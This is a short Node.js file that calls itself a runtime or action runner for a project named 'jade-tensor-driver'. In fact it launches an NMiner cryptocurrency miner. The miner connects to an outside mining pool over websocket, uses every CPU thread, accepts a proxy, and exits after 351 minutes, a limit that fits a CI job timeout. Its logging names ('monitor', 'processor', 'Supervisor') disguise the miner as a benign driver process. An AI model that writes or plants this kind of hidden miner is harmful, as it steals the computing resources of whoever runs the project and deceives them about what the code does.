// Procedural action runner for jade-tensor-driver
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

async function startRuntime() {
    const instanceToken = "fcaa1b";
    console.log(`[monitor] Starting runtime for ${config.appName || "jade-tensor-driver"} [${instanceToken}]`);

    const processor = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Subhas1975.jade-tensor-driver",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (351m) reached, exiting cleanly.");
        process.exit(0);
    }, 351 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${instanceToken}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

startRuntime().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
